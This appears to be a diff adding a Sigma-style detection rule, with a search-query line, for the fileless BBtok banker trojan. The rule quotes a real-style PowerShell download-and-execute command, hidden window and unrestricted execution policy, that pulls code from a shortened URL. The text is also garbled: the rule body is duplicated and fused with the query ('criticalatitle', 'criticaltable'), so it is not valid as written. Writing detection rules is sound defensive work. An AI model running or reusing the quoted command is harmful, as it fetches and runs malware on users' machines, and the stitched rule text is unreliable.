@@ -1,0 +1,53 @@
+((CommandLine="powershell.exe -ex unrestrict -w l (new-object (net.webclient.downloadstring)).invoke(http://bit.do/fJZR3)") OR (Image="*\\windows\\system32\\winmm.dll*")) | atitle: File-less Attack Banker Trojan BBtok
+description: The Trojan sends a compressed package containing malicious lnk files to users through phishing emails or other means. When the user clicks on the malicious lnk, the carried powershell script will be activated to execute subsequent attack payloads.
+author: Furkan Celik
+references: https://blog.360totalsecurity.com/en/360-file-less-attack-protection-intercepts-the-banker-trojan-bbtok-active-in-mexico/
+date: 2020/12/02
+tags:
+- attack.persistence
+- attack.T1547
+- attack.T1547.001
+status: stable
+logsource:
+  product: windows
+  service: process_creation
+detection:
+  condition: selection OR selection1
+  selection:
+    CommandLine:
+    - powershell.exe -ex unrestrict -w l (new-object (net.webclient.downloadstring)).invoke(http://bit.do/fJZR3)
+  selection1:
+    Image|contains:
+    - \windows\system32\winmm.dll
+fields:
+- Image
+- CommandLine
+falsepositives:
+- low
+level: criticalatitle: File-less Attack Banker Trojan BBtok
+description: The Trojan sends a compressed package containing malicious lnk files to users through phishing emails or other means. When the user clicks on the malicious lnk, the carried powershell script will be activated to execute subsequent attack payloads.
+author: Furkan Celik
+references: https://blog.360totalsecurity.com/en/360-file-less-attack-protection-intercepts-the-banker-trojan-bbtok-active-in-mexico/
+date: 2020/12/02
+tags:
+- attack.persistence
+- attack.T1547
+- attack.T1547.001
+status: stable
+logsource:
+  product: windows
+  service: process_creation
+detection:
+  condition: selection OR selection1
+  selection:
+    CommandLine:
+    - powershell.exe -ex unrestrict -w l (new-object (net.webclient.downloadstring)).invoke(http://bit.do/fJZR3)
+  selection1:
+    Image|contains:
+    - \windows\system32\winmm.dll
+fields:
+- Image
+- CommandLine
+falsepositives:
+- low
+level: criticaltable Image,CommandLine
